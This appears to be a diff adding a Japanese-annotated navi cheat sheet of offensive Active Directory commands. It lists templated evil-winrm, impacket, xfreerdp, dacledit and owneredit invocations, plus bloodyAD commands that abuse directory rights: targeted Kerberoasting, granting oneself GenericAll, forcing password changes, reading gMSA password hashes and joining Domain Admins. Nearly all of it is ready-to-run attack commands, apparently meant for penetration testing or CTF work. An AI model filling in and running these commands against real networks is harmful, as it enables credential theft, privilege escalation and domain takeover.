@@ -1,0 +1,55 @@
+% 横移動, evil-winrm
+
+# evil-winrm: 入る（パスワード・ハッシュ・チケット）
+evil-winrm -i <host> <auth_winrm>
+
+
+% 横移動, impacket
+
+# impacket-psexec・wmiexec など: 入ってコマンドを打つ（道具・資格情報を選ぶ。このあと NTLM/Kerberos）
+impacket-<exec> <auth_imp>
+
+
+% 横移動, mssqlclient
+
+# impacket-mssqlclient: MSSQL に入る（資格情報を選び、このあと Windows 認証か SQL のログインか）
+impacket-mssqlclient <auth_mssql>
+
+
+% 横移動, xfreerdp
+
+# xfreerdp: RDP で入る（パスワード・ハッシュ。クリップボード・いまの場所を共有。背景で）
+xfreerdp /v:<host> <auth_rdp> /clipboard /cert-ignore /dynamic-resolution /drive:linux,. /scale:180 &
+
+
+% 横移動, bloodyAD
+
+# bloodyAD: Deleted Objects（AD のごみ箱・Recycle Bin）→ 消されたユーザーを探す・SID で戻す（Restore。戻したアカウントを使う）
+bloodyAD <auth_bloody> <deleted_act>
+
+# bloodyAD: GenericWrite・WriteSPN → 対象に SPN を書く・確かめる（Targeted Kerberoasting。書いたら Kerberoasting で取る）
+bloodyAD <auth_bloody> <spn_act>
+
+# bloodyAD: WriteDacl → 対象に GenericAll を付ける（付ける先は自分）
+bloodyAD <auth_bloody> add genericAll '<target_user>' '<member>'
+
+# bloodyAD: ForceChangePassword → 対象のパスワードを変える
+bloodyAD <auth_bloody> set password '<target_user>' '<new_pass>'
+
+# bloodyAD: ReadGMSAPassword → gMSA のパスワード（NT ハッシュ）を読む（対象は 名前$）
+bloodyAD <auth_bloody> get object '<target_user>' --attr msDS-ManagedPassword
+
+# bloodyAD: AddSelf・AddMember → グループに入れる・確かめる（入れるのは自分。Domain Admins などの権限を得る）
+bloodyAD <auth_bloody> <group_act>
+
+
+% 横移動, dacledit
+
+# impacket-dacledit: WriteDacl → 対象に FullControl を書く（付ける先は自分。OU は DN を貼ると中にも継承）
+impacket-dacledit -dc-ip <dc> <auth_impn> -action write -rights FullControl -principal '<member>' <dacl_target>
+
+
+% 横移動, owneredit
+
+# impacket-owneredit: WriteOwner → 対象の持ち主を自分にする（このあと dacledit で FullControl）
+impacket-owneredit -dc-ip <dc> <auth_impn> -action write -new-owner '<member>' <owner_target>
